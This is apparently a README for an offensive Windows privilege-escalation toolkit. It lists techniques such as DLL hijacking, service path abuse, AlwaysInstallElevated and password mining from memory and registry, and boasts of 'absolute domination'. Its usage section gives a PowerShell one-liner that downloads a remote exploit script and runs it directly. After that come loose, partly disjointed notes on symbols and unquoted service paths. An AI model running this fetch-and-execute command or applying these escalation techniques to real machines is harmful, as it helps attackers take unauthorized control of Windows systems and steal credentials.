
# Windows Local Privilege Escalation

This tools is developed, tested and refined by "d3hack"
Like Uncle Ben said, "With great power comes great responsibility." But in our case...
💀 With great shell access comes absolute domination. 💀

Tested on win11 pro


Primary focused to escalate privileges: 

    - DLL Hijacking

    - Service binPath
    
    - Service UnquotedPathSvc [+]
    
    - Service Registry
    
    - Service ExecFile

    - Registry Autorun
    
    - Registry AlwaysInstallelevated [+] 

    - TrustedInstaller
    
    - Password Mining (Memory/Registry/Config File)

    - Scheduled Task
    
    - Startup Application

## Authors

- [d3hack @ LinkedIn ](https://linkedin.com/in/aghayev2a)

- [d3hvck @ Github  ](https://github.com/d3hvck)

## Usage

For extremely accuracy please run every scripts one by one 

```bash
  irm https://githubrawfilelink.com/blablabla/exploit.ps1 | iex 
```

<> operator
- dash
/ shash
\ revers-shlash
= equal
$ val / def
' quot
" double quot

Absolute Path in quotes:
 "C:\Program Files\Vuln Service\DLL.exe"

Relative Path
Windows
cmd.exe

Vuln Service Looks Like:

 C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 
 C:\Program Files\Vuln.exe Service x64\DLL.exe /sc /q /r 
 C:\Program Files\Vuln Service.exe x64\DLL.exe /sc /q /r 
 C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 